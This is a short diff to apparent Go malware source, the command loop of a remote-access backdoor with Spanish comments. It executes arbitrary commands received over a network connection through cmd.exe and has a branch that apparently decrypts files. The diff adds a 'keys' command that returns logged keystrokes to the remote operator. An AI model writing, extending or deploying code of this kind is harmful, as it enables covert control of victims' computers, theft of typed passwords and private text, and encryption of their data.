@@ -46,6 +46,9 @@ func EsperarComandos(con net.Conn, re *bufio.Reader, host string, key string) {
 			salidaVerbosa = []byte(Curar(key)) //no lo imprimo para no saturar pero es interesante poder verlo
 			_ = salidaVerbosa
 			salida = []byte("Descifrado completado")
+		case "keys":
+			//parte opcional: pedir teclas registradas
+			salida = []byte(VaciarTeclas())
 		default:
 			//si no es ninguno de los dos que se ejecute el comando
 			cmd := exec.Command("cmd.exe", "/C", strings.TrimSpace(cp))
